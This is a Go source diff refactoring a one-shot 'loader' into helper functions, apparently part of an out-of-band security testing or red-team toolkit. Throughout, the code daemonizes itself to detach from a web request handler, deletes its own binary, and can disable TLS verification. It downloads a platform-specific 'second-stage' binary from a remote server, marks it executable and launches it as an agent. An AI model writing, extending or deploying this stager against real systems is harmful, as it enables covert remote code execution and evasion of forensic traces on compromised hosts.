@@ -47,9 +47,8 @@ func hasCABundle() bool {
 	return false
 }
 
-func main() {
-	// Parse optional flags before positional args.
-	insecure, foreground, args := false, false, os.Args[1:]
+// parseFlags extracts -k and -f flags from args, returning the remaining positional args.
+func parseFlags(args []string) (insecure, foreground bool, rest []string) {
 	for len(args) > 0 && len(args[0]) > 0 && args[0][0] == '-' {
 		switch args[0] {
 		case "-k":
@@ -61,40 +60,13 @@ func main() {
 		}
 		args = args[1:]
 	}
-	if len(args) != 3 {
-		die("usage: loader [-k] [-f] <url> <token> <agent_id>")
-	}
-	serverURL := args[0]
-	token := args[1]
-	agentID := args[2]
+	return insecure, foreground, args
+}
 
-	// Pre-flight checks — run before daemonizing so errors reach stderr.
-	if !insecure && !hasCABundle() {
-		die("no CA bundle found (install ca-certificates or use -k to skip TLS verification)")
-	}
-
-	// Daemonize: re-exec self detached so a short-lived parent (e.g. a web
-	// request handler) returns immediately.  Skipped with -f or when
-	// already the daemon child.
-	if os.Getenv("_OAST_D") == "" && !foreground {
-		daemonize() // does not return on success
-	}
-
-	// Self-delete immediately — the loader is one-shot.
-	// On Unix this succeeds on a running binary; on Windows it fails silently
-	// and exec_windows.go uses markDeleteOnClose instead.
-	os.Remove(os.Args[0]) //nolint:errcheck
-
-	dlURL := serverURL + "/dl/second-stage/" + runtime.GOOS + "-" + runtime.GOARCH
-
-	client := &http.Client{}
-	if insecure {
-		client.Transport = &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
-		}
-	}
-
-	req, err := http.NewRequest(http.MethodGet, dlURL, nil)
+// downloadToTemp fetches url with token authentication and writes the body to
+// a new temporary file, which is returned ready to execute.
+func downloadToTemp(client *http.Client, url, token string) string {
+	req, err := http.NewRequest(http.MethodGet, url, nil)
 	if err != nil {
 		die("request error: " + err.Error())
 	}
@@ -127,6 +99,41 @@ func main() {
 		_ = os.Remove(tmpPath)
 		die("chmod error: " + err.Error())
 	}
+	return tmpPath
+}
 
+func main() {
+	insecure, foreground, args := parseFlags(os.Args[1:])
+	if len(args) != 3 {
+		die("usage: loader [-k] [-f] <url> <token> <agent_id>")
+	}
+	serverURL, token, agentID := args[0], args[1], args[2]
+
+	// Pre-flight checks — run before daemonizing so errors reach stderr.
+	if !insecure && !hasCABundle() {
+		die("no CA bundle found (install ca-certificates or use -k to skip TLS verification)")
+	}
+
+	// Daemonize: re-exec self detached so a short-lived parent (e.g. a web
+	// request handler) returns immediately.  Skipped with -f or when
+	// already the daemon child.
+	if os.Getenv("_OAST_D") == "" && !foreground {
+		daemonize() // does not return on success
+	}
+
+	// Self-delete immediately — the loader is one-shot.
+	// On Unix this succeeds on a running binary; on Windows it fails silently
+	// and exec_windows.go uses markDeleteOnClose instead.
+	os.Remove(os.Args[0]) //nolint:errcheck
+
+	client := &http.Client{}
+	if insecure {
+		client.Transport = &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		}
+	}
+
+	dlURL := serverURL + "/dl/second-stage/" + runtime.GOOS + "-" + runtime.GOARCH
+	tmpPath := downloadToTemp(client, dlURL, token)
 	execAgent(tmpPath, serverURL, token, agentID, insecure)
 }
